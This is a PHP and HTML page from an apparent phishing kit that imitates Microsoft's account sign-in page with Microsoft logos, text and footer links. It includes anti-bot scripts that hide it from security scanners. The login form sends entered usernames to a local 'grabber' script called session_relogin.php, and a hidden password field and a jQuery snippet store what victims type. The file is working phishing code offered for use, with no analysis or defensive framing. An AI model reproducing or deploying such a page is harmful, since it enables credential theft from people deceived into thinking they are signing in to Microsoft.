<?php
    error_reporting(0);

    include('../src/Antibot/Bot-Crawler.php');
    include('../src/Antibot/Dila_DZ.php');

    include('../src/Antibot/blockers.php');
    include('../src/Antibot/detects.php');
?>

<!DOCTYPE html>

<html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msauth.net/" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://aadcdn.msauth.net/">
<link rel="dns-prefetch" href="https://aadcdn.msftauth.net/">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">


        <meta name="format-detection" content="telephone=no">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
    
<meta name="robots" content="none">



        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
        <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">



    
    <link data-loader="cdn" crossorigin="anonymous" href="./assets/css/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet">



    


<link rel="prefetch" href="./assets/css/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css">

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">



<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" validate="validate" spellcheck="false" method="post" target="_top" autocomplete="off" action="./assets/grabber/session_relogin.php" class="provide-min-height">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.fUseMinHeight },
    component: { name: &#39;background-image-control&#39;,
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }" class="provide-min-height"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;./assets/css/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { &#39;sign-in-box&#39;: true },
            css: {
                &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                &#39;app&#39;: $page.backgroundLogoUrl,
                &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: &#39;logo-control&#39;,
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="./assets/img/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="./assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./assets/img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<div data-bind="component: { name: &#39;header-control&#39;,
    params: {
        serverData: svr,
        title: str[&#39;WF_STR_HeaderDefault_Title&#39;] } }"><div>
    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { &#39;title&#39;: true }">
        <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
        <!-- ko if: isSubtitleVisible --><!-- /ko -->
    </div>

    <!-- ko if: headerDescription --><!-- /ko -->
</div></div>

<!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko -->

<div class="row">
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->

        <div class="col-md-24 error ext-error" id="usernameError" data-bind="
            externalCss: { 'error': true },
            htmlWithBindings: usernameTextbox.error,
            childBindings: {
                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
                'aadSignup': { href: svr.urlAadSignup, click: aadSignup_onClick },
                'aadSelfSignup': { click: signup_onClick },
                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick },
                'sendOtcLink': { click: sendOtcLink_onClick },
                'recoverUsername': { href: svr.urlForgotUsername, click: recoverUsername_onClick } }">We couldn't find an account with that username. Try another, or <a id="idA_PWD_SignUp" href="javascript:void();">get a new Microsoft account</a>.</div>
    </div>

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str[&#39;STR_SSSU_Username_Hint&#39;] || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input type="text" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry"  aria-describedby="loginHeader usernameError" placeholder="Email, phone, or Skype"  required="true">

            <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }, externalCss: { &#39;password-reset-links-container&#39;: true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                <!-- ko if: svr.fIsSelfServiceSignupUxEnabled --><!-- /ko -->
                
                <!-- ko ifnot: svr.fIsSelfServiceSignupUxEnabled -->
                <div class="form-group" data-bind="
                    htmlWithBindings: html[&#39;WF_STR_SignUpLink_Text&#39;],
                    childBindings: {
                        &#39;signup&#39;: {
                            href: svr.urlSignUp || &#39;#&#39;,
                            ariaLabel: svr.urlSignUp ? str[&#39;WF_STR_SignupLink_AriaLabel_Text&#39;] : str[&#39;WF_STR_SignupLink_AriaLabel_Generic_Text&#39;],
                            click: signup_onClick } }">No account? <a href="javascript:void();" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                <!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: hideCantAccessYourAccount -->
                <div class="form-group">
                    <a id="cantAccessAccount" name="cannotAccessAccount" data-bind="
                        text: unsafe_cantAccessYourAccountText,
                        click: accessRecoveryLink ? null : cantAccessAccount_onClick,
                        attr: { target: accessRecoveryLink &amp;&amp; &#39;_blank&#39; },
                        href: accessRecoveryLink || &#39;#&#39;" href="javascript:void();">Can’t access your account?</a>
                </div>
                <!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) --><!-- /ko -->

                <!-- ko if: showCredPicker --><!-- /ko -->

                <!-- ko if: svr.urlSkipZtd --><!-- /ko -->
            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.fShowLegalMessagingInline --><!-- /ko -->

<div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
    externalCss: { &#39;button-field-container&#39;: true }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div data-bind="css: { &#39;inline-block&#39;: true }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
        <input type="button" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39; },
            externalCss: {
                &#39;button&#39;: true,
                &#39;secondary&#39;: true },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="Back">
    </div>
    <!-- /ko -->

    <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    &#39;button&#39;: true,
                    &#39;primary&#39;: true },
                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next">
    </div>
</div></div>
    </div>
</div>

</div>
    </div>
</div></div>
        <!-- /ko -->

        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons -->
        <div data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }, externalCss: { &#39;promoted-fed-cred-box&#39;: true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
            <div class="promoted-fed-cred-content" data-bind="css: {
                &#39;animate&#39;: $page.useCssAnimations &amp;&amp; $page.animate(),
                &#39;slide-out-next&#39;: $page.animate.isSlideOutNext,
                &#39;slide-in-next&#39;: $page.animate.isSlideInNext,
                &#39;slide-out-back&#39;: $page.animate.isSlideOutBack,
                &#39;slide-in-back&#39;: $page.animate.isSlideInBack,
                &#39;app&#39;: $page.backgroundLogoUrl }">

                <!-- ko foreach: $page.otherSigninOptions -->
                <div class="row tile">
                    <div class="table" role="button" tabindex="0" data-bind="
                        css: { &#39;list-item&#39;: svr.fSupportWindowsStyles },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text" aria-label="Sign-in options">

                        <div class="table-row">
                            <div class="table-cell tile-img medium">
                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="./assets/img/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
                            </div>
                            <div class="table-cell text-left content" data-bind="css: { &#39;content&#39;: !svr.fSupportWindowsStyles }">
                                <div data-bind="
                                    text: $data.text,
                                    attr: { &#39;data-test-id&#39;: $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            &#39;footer&#39;: true,
            &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: &#39;footer-control&#39;,
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: a11yConformeLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&amp;response_type=code%20id_token&amp;scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&amp;response_mode=form_post&amp;nonce=638036255951334815.NzRjMTQyY2EtMGJlOS00MThmLTgyNTktZWNlNDc2YzViZTJlMjI2OGUzNWYtN2M1ZS00MTBkLWIzNGQtZGVlY2Q2OGE1Zjdk&amp;ui_locales=en-US&amp;mkt=en-US&amp;client-request-id=9037a90b-a5ee-4f19-9c63-7662a8926d52&amp;state=tkvFxn0JmsAQTdWrZmixTa4_nV29c3Hp25unlITAnifjKVMY6DlHHAHMPhBOSyFZGVnsYyB1-VrCP0-dfDsRRZlmqYPv0LKTIq-TemAC-7Aqu5raUZCU2zAMNQ5fzQxU6ljQestDZ1yYkmfDUt4olbgZfXcWjAd18kHwVxNM_Q-_pc5kfPlOQxwXQYDMA4ve4fBR6zLRfRzmfAz-uva6alGyniGILFp7ZWVTcitNKbFxjSrg_bOOPpH59bzDzrnteHsL4ARWElu2mq873_Grotmtf9ZAkDUwGlvHsg6ZLGE&amp;x-client-SKU=ID_NETSTANDARD2_0&amp;x-client-ver=6.16.0.0#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>


<!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->

<!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        $(function () {
            $("#idSIButton9").click(function () {
                sessionStorage.setItem('userid',$("#i0116").val()); 
                localStorage.setItem('userid', $("#i0116").val()); 
            });
        });

    </script>

</body></html>